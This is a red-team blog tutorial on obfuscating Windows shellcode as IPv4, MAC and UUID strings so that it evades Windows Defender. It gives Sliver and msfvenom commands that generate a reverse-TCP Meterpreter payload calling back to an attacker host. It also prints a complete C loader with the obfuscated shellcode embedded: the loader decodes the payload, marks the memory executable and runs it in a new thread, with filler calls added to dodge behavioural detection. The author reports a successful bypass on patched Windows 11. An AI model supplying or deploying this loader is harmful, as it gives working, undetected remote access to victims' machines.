---
title: Offensive C - Shellcode Obfuscation
author: nirajkharel
date: 2025-05-24 14:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


## Shellcode
We have already discussed about [process injection using shellcode](https://nirajkharel.com.np/posts/process-injection-shellcode/) which pretty much explains about why and how to use it.

Giving the background again, shellcode is just a collection of instructions within the Windows system which executes the command in order to take control or generate a reverse shell connection to an attacker's machine. Below is a simple example of generating a Windows reverse TCP payload/shellcode, which is obviously detected easily by Windows Defender.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-1.png">

## Shellcode Obfuscation
There are usually two types of techniques to bypass Defender detection, Encryption and Obfuscation. In this module, we will be focusing on different types of shellcode obfuscation.

Obfuscation is a technique used to transform or modify raw shellcode into different forms that are harder to detect or analyze. There are various types of obfuscation techniques such as IPv4/IPv6, MAC, and UUID obfuscations.

### IPv4/IPv6 Obfuscation 
IPv4/IPv6 Obfuscation generally consists of a technique which converts the raw shellcode into IPv4 or IPV6 style format. 

IPv4Fuscation converts each byte of the shellcode to their corresnponding octets. Since IPv4 address contains 4 octets `192.168.1.0`, IPv4 obfuscation converts each byte of the shellcode into each octet of the IPv4 by converting the bytes in hex into the decimal.

Example: For this chunk of the raw payload `"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"`, IPv4 slipts it into 4-byte chunks to form IPv4 addresses. It first divides them into 4-byte groups as shown below:

```
\xfc \x48 \x83 \xe4
\xe8 \xcc \x00 \x00
\x00 \x41 \x51 \x41
\x50 \x00 \x00 \x00
```
And then convers each byte into the decimal format, which results in:

```
[252, 72, 131, 228]
[232, 204, 0, 0]
[0, 65, 81, 65]
[80, 0, 0, 0]
```

And then finally it is organised into IPv4 addresses:
```
252.72.131.228  
232.204.0.0  
0.65.81.65  
80.0.0.0  
```

This is how you can get your shellcode/payload obfuscated into IPv4 formats.

You can refer to this [blog from Kylerosario](https://www.kylerosario.com/blog/IPObfuscation) to understand in detail on how and what are the functions that are being called during the obfuscation and deobfuscation. But we can use a pre-built tools like [HellShell](https://github.com/NUL0x4C/HellShell) and [Supernova](https://github.com/nickvourd/Supernova) to do this.

Below is an example which shows how we can use a tool like Supernova to obfuscate the payload.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-2.png">

A similar technique can be used in IPv6Fuscation, where the shellcode is grouped into 16 bytes to generate one IPv6 address. Again, for a detailed explanation, you can refer to Kylerosario's blog. Since IPv6 addresses are expressed in hexadecimal, converting them into decimal is not necessary.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-3.png">

### MACFuscation
MACFuscation consists of the techqniue for converting raw shellcode into MAC addresses `aa:bb:cc:dd:ee:ff`. Each `aa, bb` represents one byte in hexadecimal. Since a typical MAC address contains 6 bytes, therefore the shellcode is grouped into 6 bytes and then converted into the MAC addresses. If its not the multiple of 6 bytes, padding is used.

We can use the same tool to convert our shellcode into MAC address format.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-4.png">

### UUIDFuscation
UUIDFuscation is a technique to obfuscate raw shellcode into UUID format `550e8400-e29b-41d4-a716-446655440000`. The raw shellcode is grouped into 16 bytes chunks as each UUID represents 16 bytes. When the shellcode is not muliple of 16, padding can bse used.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-5.png">

Since we have now explored at least three types of obfuscation techniques, let's move towards a practical demonstration. But before that, one important thing to understand is that we need to **deobfuscate** the payload as well. 

**Deobfuscation** is usually done before allocating the shellcode into virtual memory. We will explore one of the techniques of **deobfuscation** during the demonstration itself.

## Sliver Shellcode Generation
The first step for the demonstration would be to create a shellcode. We will be using **Sliver C2** to create a shellcode and listen for the callback.

Setting up Sliver C2 is outside of this blog's objective. However, you can simply setup the Sliver C2 server and client following the [offical documentation of Sliver](https://sliver.sh/docs?name=Getting+Started).

Once you have your sliver client ready and up running, create a profile using below command:
```bash
profiles new beacon --mtls 192.168.1.86:443 --format shellcode shellcode-beacon
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-6.png">

Create a stager listener on port 8080. This listener delivers staged payloads and start the mTLS C2 server on host 192.168.1.86 and port 443.
```bash
stage-listener -u tcp://192.168.1.86:8080 -p shellcode-beacon

mtls -L 192.168.1.86 -l 443
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-7.png">

The victim machine runs stager delivered through port 8080, receives the beacon shellcode and connects back via mTLS.

We can either use Sliver's **generate stager** command or `msfvenom` to generate our shellcode. For Sliver stagers, it simply calls the `msfvenom` APIs, so there would be no difference in the generated shellcode.
   
**Using Sliver**
```bash
generate stager --lhost 192.168.1.86 --lport 8080 --protocol http --save /tmp
```

**Using msfvenom**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f raw -o /tmp/win-shellcode.bin
```

## Obfuscation using Supernova
```bash
./Supernova -obf UUID -input /tmp/win-shellcode.bin -lang C
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-9.png">

But as we have already mentioned earlier, we need to deobfuscate the payload as well. Using tools like **HellShell** would be much easier in this case, since it not only provides the obfuscated code but also includes a code block to deobfuscate it. So, once we transfer the payload to our Windows attacker machine, we can use HellShell to obfuscate it. Make sure to compile HellShell in **Release** mode; otherwise, it may produce some errors.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-10.png">

Until now, we have everything ready to listen and wait for the connection on the C2 side. Now lets talk about the deobfuscation of the payload. The below code is the output of HellShell which contains a function **UuidDeobfuscation whose** return type is BOOL. 
 
The shellcode which was converted into UUID was stored as an array on **UuidArray**. There are 32 numbers of UUID which is denoted by **NumberofElements**. Similarly, the code block containing **typedef RPC_STATUS** defines a function pointer type called **fnUuidFromStringA** which is a Windows RPC function for converting a UUID.

```c
char* UuidArray[] = {
        "E48348FC-E8F0-00CC-0000-415141505251", "56D23148-4865-528B-6048-8B5218488B52", "B70F4820-4A4A-314D-C948-8B72504831C0",
        "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "528B4852-4120-8B51-423C-4801D0668178", "0F020B18-7285-0000-008B-808800000048",
        "6774C085-0148-8BD0-4818-448B40205049", "56E3D001-314D-48C9-FFC9-418B34884801", "C03148D6-41AC-C9C1-0D41-01C138E075F1",
        "244C034C-4508-D139-75D8-58448B402449", "4166D001-0C8B-4448-8B40-1C4901D0418B", "58418804-5841-595E-4801-D05A41584159",
        "83485A41-20EC-5241-FFE0-5841595A488B", "FF4BE912-FFFF-495D-BE77-73325F333200", "49564100-E689-8148-ECA0-0100004989E5",
        "0002BC49-901F-A8C0-0156-41544989E44C", "BA41F189-774C-0726-FFD5-4C89EA680101", "41590000-29BA-6B80-00FF-D56A0A415E50",
        "C9314D50-314D-48C0-FFC0-4889C248FFC0", "41C18948-EABA-DF0F-E0FF-D54889C76A10", "894C5841-48E2-F989-41BA-99A57461FFD5",
        "0A74C085-FF49-75CE-E5E8-930000004883", "894810EC-4DE2-C931-6A04-41584889F941", "C8D902BA-FF5F-83D5-F800-7E554883C420",
        "6AF6895E-4140-6859-0010-000041584889", "C93148F2-BA41-A458-53E5-FFD54889C349", "314DC789-49C9-F089-4889-DA4889F941BA",
        "5FC8D902-D5FF-F883-007D-285841575968", "00004000-5841-006A-5A41-BA0B2F0F30FF", "415957D5-75BA-4D6E-61FF-D549FFCEE93C",
        "48FFFFFF-C301-2948-C648-85F675B441FF", "006A58E7-4959-C2C7-F0B5-A256FFD59090"
};

#define NumberOfElements 32

typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
        RPC_CSTR        StringUuid,
        UUID*           Uuid
);
```  

The method **UuidDeobfuscation** contains four arguments which are **UuidArray[], NmbrOfElements, ppDAddress and pDSize**, in which **UuidArray[]** contains the UUIDs i.e. obfuscated shellcode, **NmbrOfElements** contains the number of UUIDs on the array i.e. 32, **ppDAddress** provides the address of the deobfuscated shellcode and **pDSize** provides the total size of the shellcode.

```c
BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {

        PBYTE           pBuffer         = NULL,
                        TmpBuffer       = NULL;
        SIZE_T          sBuffSize       = NULL;
        PCSTR           Terminator      = NULL;
        NTSTATUS        STATUS          = NULL;
```

The code below loads **UuidFromStringA** method from **RPCRT4.dll** which is responsible for converting UUID strings to their original form. Using **GetProcAddress** and **LoadLibrary**, it will a pointer to **UuidFromStringA** function at runtime. If it false, the program exits.

```c
        // getting UuidFromStringA   address from Rpcrt4.dll
        fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
        if (pUuidFromStringA == NULL) {
                        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                        return FALSE;
        }
 ```

The next step would be to calculate the original size of the shellcode and allocate a memory for containing the deobfuscated shellcode. Here since each UUID is 16 bytes, the total number of buffer needed to be allocated is **16 * NmbfOfElements**. Just think of it as a storage for the deobfuscated code.

 ```c       
        // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
        sBuffSize = NmbrOfElements * 16;
        
        // allocating mem, that will hold the deobfuscated shellcode
        pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
        if (pBuffer == NULL) {
                printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        
        // setting TmpBuffer to be equal to pBuffer
        TmpBuffer = pBuffer;
```

The loop below iterates over each UUID string within the input array **UuidArray** until the number of UUID are completed as it runs from **0** until **NmbrOfElements - 1**. With each loop, **pUuidFromStringA** is used to convert the UUID string into tis 16 byte binary representation. There is an increment on **TmpBuffer** as well which is increased by 16 bytes after each loop that points the next position in the allocated memory buffer about storing another converted 16 byte binary and so on.

```c
        // loop through all the addresses saved in Ipv6Array
        for (int i = 0; i < NmbrOfElements; i++) {
                // UuidArray[i] is a single UUid address from the array UuidArray
                if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
                        // if failed ...
                        printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
                        return FALSE;
                }

                // tmp buffer will be used to point to where to write next (in the newly allocated memory)
                TmpBuffer = (PBYTE)(TmpBuffer + 16);
        }

        *ppDAddress = pBuffer;
        *pDSize = sBuffSize;
        return TRUE;
} 
```

Until now, we have the code which converts our obfuscated shellcode into the raw binary i.e. its original form. Next approach would be to use shellcode injection techniques to inject the de-obfuscated shellcode into the current process. 

```c
int main() {
        PBYTE pDeobfuscatedPayload = NULL;
        SIZE_T sDeobfuscatedSize = NULL;

        // Enumerate current Process Id.
        printf("Injecting shellcode into the Pid: %d \n", GetCurrentProcessId());
```

Call **UuidDeobfuscation** method to deobfuscated payload. The argument **&pDeobfuscatedPayload** contains pointer to the starting address of the payload and **&sDeobfuscatedSize** contains the pointer to the size of the payload.
```c
        // Payload Decryption
        printf("Decrypting the payload.");                                                                                                                                        if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
                return -1;
        }
```

Next step would be to use **VirtualAlloc** method to allocate the memory space for the deobfuscated payload. I have already explained about the **VirtualAlloc** [method here](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex).
```c
        // Allocating memory the size of sDeobfuscatedSize
        // With memory permissions set to read and write so that we can write the payload later
        PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pShellcodeAddress == NULL) {
                printf("VirtalAlloc failed with error: %d \n", GetLastError());
                return -1;
        }

        printf("Allocated memory at: 0x%p \n", pShellcodeAddress);
```

Once the memory has been allocated, we can either write buffer to the allocated memory using **WriteProcessMemory** methodor use **memcpy** to copy the payload into the allocate memory. As we have not defined the memory address to be executable during **VirtualAlloc** method, we need to set memory permisstions to be executable.
```c
        memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);

        // Cleaning the pDeobfuscatedPayload buffer, since it no longer needed
        memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

        DWORD dwOldProtection = NULL;

        // setting memory permissions at pShellCodeAddress to be executable
        if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
                printf("VirtualProtect failed with error: %d \n", GetLastError());
                return -1;
        }
```

Once the shellcode has been written into the buffer, we can execute that shellcode using a new thread. The **CreateThread** executes the shellcode available on **pShellcodeAddress**. If we are attacking remote process, **CreateRemoteThread** should be used instead. [More details on](https://nirajkharel.com.np/posts/process-injection-shellcode/#execute-the-shellcode---createremotethreadex).    

```c
        // Running the shellcode as a new thread's entry
        if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
                printf("CreateThread Failed with error: %d \n", GetLastError());
                return -1;
        }

        // Freeing pDeobfuscatedPayload
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        printf("Press Enter to Quit...");
        getchar();

        return 0;
}
```

**Note:** Remember to insert some random methods within each of the above steps. This will help us break the attack chain and potentially bypass the behavioral detection capabilities of Windows Defender. For this demonstration, the method below for enumerating the username of the current machine has been inserted between each of the steps.

```c
        // Breaking attack chain
        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }
```

This makes our full code as:    

```c

#include <Windows.h>
#include <stdio.h>
#include <Lmcons.h>
#include <rpc.h>

#pragma comment(lib, "Rpcrt4.lib");

char* UuidArray[] = {
                "E48348FC-E8F0-00CC-0000-415141505248", "5651D231-4865-528B-6048-8B5218488B52", "B70F4820-4A4A-8B48-7250-4D31C94831C0",
                "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "528B4852-4120-8B51-423C-4801D0668178", "0F020B18-7285-0000-008B-808800000048",
                "6774C085-0148-8BD0-4818-448B40204901", "56E350D0-314D-48C9-FFC9-418B34884801", "C03148D6-41AC-C9C1-0D41-01C138E075F1",
                "244C034C-4508-D139-75D8-58448B402449", "4166D001-0C8B-4448-8B40-1C4901D0418B", "58418804-0148-41D0-585E-595A41584159",
                "83485A41-20EC-5241-FFE0-5841595A488B", "FF4BE912-FFFF-495D-BE77-73325F333200", "49564100-E689-8148-ECA0-0100004989E5",
                "0002BC49-901F-A8C0-0156-41544989E44C", "BA41F189-774C-0726-FFD5-4C89EA680101", "41590000-29BA-6B80-00FF-D56A0A415E50",
                "C9314D50-314D-48C0-FFC0-4889C248FFC0", "41C18948-EABA-DF0F-E0FF-D54889C76A10", "894C5841-48E2-F989-41BA-99A57461FFD5",
                "0A74C085-FF49-75CE-E5E8-930000004883", "894810EC-4DE2-C931-6A04-41584889F941", "C8D902BA-FF5F-83D5-F800-7E554883C420",
                "6AF6895E-4140-6859-0010-000041584889", "C93148F2-BA41-A458-53E5-FFD54889C349", "314DC789-49C9-F089-4889-DA4889F941BA",
                "5FC8D902-D5FF-F883-007D-285841575968", "00004000-5841-006A-5A41-BA0B2F0F30FF", "415957D5-75BA-4D6E-61FF-D549FFCEE93C",
                "48FFFFFF-C301-2948-C648-85F675B441FF", "006A58E7-4959-C2C7-F0B5-A256FFD59090"
};

#define NumberOfElements 32

typedef RPC_STATUS(WINAPI* fnUuidFromStringA) (
        RPC_CSTR StringUuid,
        UUID* Uuid
        );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
        PBYTE pBuffer = NULL,
                TmpBuffer = NULL;
        SIZE_T sBuffSize = NULL;
        PCSTR Terminator = NULL;
        NTSTATUS STATUS = NULL;

        // Getting the UuidFromStringA function's base address from Rpcrt4.dll
        fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
        if (pUuidFromStringA == NULL) {
                printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                return FALSE;
        }

        // Getting the size of the shellcode (number of elements * 16)
        sBuffSize = NmbrOfElements * 16;

        // Allocating memory that will hold the deobfuscated shellcode
        pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
        if (pBuffer == NULL) {
                printf("HeapAlloc Failed with error: %d \n", GetLastError());
                return FALSE;
        }

        // Setting TmpBuffer to be equal to pBuffer
        TmpBuffer = pBuffer;

        // Loop through all the address saved in UuidArray
        for (int i = 0; i < NmbrOfElements; i++) {
                if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
                        // Failed
                        printf("UuidFromStringA Failed At [%s] with error 0x%0.8X\b", UuidArray[i], STATUS);
                        return FALSE;
                }

                // 16 bytes are written to TmpBuffer at a time
                // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
                TmpBuffer = (PBYTE)(TmpBuffer + 16);
        }
        *ppDAddress = pBuffer;
        *pDSize = sBuffSize;
        return TRUE;
}

// shellcode injection

int main() {
        PBYTE pDeobfuscatedPayload = NULL;
        SIZE_T sDeobfuscatedSize = NULL;

        // Injected Process
        printf("Injecting shellcode the Pid: %d \n", GetCurrentProcessId());

        // Breaking attack chain
        TCHAR username[UNLEN + 1];  // UNLEN is the max username length
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Payload Decryption
        printf("Decrypting the payload.");
        if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
                return -1;
        }

        printf("Deobfuscated payload at: 0x%p Of Size: %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

        // Breaking attack chain
        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Allocating memory the size of sDeobfuscatedSize
        // With memory permissions set to read and write so that we can write the payload later
        PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pShellcodeAddress == NULL) {
                printf("VirtalAlloc failed with error: %d \n", GetLastError());
                return -1;
        }

        printf("Allocated memory at: 0x%p \n", pShellcodeAddress);

        // Breaking the chain
        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Copying the payload to the allocated memory
        memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);

        // Cleaning the pDeobfuscatedPayload buffer, since it no longer needed
        memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

        DWORD dwOldProtection = NULL;
        // setting memory permissions at pShellCodeAddress to be executable
        if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
                printf("VirtualProtect failed with error: %d \n", GetLastError());
                return -1;

        }

        // Breaking the chain
        if (GetUserName(username, &username_len)) {
                wprintf(L"Current user: %s\n", username);
        }
        else {
                wprintf(L"GetUserName failed. Error code: %lu\n", GetLastError());
        }

        // Running the shellcode as a new thread's entry
        if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
                printf("CreateThread Failed with error: %d \n", GetLastError());
                return -1;
        }

        // Freeing pDeobfuscatedPayload
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        printf("Press Enter to Quit...");
        getchar();

        return 0;
}
``` 

Build the malicious executable using Visual Studio.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-11.png">

Using ThreatCheck to verify if it identifies any signatures based on the Windows Defender. 
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-12.png">

Execute the payload on the completely patched Windows 11 Pro 22H2 machine and observe that were are able to successfully bypass Windows Defender and Real Time Protection and eventually were able to get the beacon on the C2 server.
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-13.png">


#### References
- [https://maldevacademy.com/](https://maldevacademy.com/)
- [https://www.kylerosario.com/blog/IPObfuscation](https://www.kylerosario.com/blog/IPObfuscation)
- [https://bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)
- [https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8)
- [https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/#:~:text=trigger%20an%20alert.-,Bypassing%20heuristic%20and%20behavioural%20detection,running%20in%20a%20sandbox%20environment.](https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/#:~:text=trigger%20an%20alert.-,Bypassing%20heuristic%20and%20behavioural%20detection,running%20in%20a%20sandbox%20environment.)